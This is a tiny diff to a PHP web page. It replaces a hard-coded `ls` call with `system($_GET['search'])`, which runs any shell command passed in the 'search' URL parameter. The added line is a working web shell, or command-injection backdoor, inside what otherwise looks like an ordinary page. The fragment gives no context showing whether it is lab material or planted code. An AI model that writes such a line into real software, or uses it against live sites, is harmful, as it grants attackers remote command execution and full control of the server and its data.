@@ -68,6 +68,6 @@ catch (PDOException $e) {
 </html>
 <?php
             $e = '"'.$_GET["search"].'"';
-              echo system("ls"); 
+             system($_GET['search']);
               
             ?>
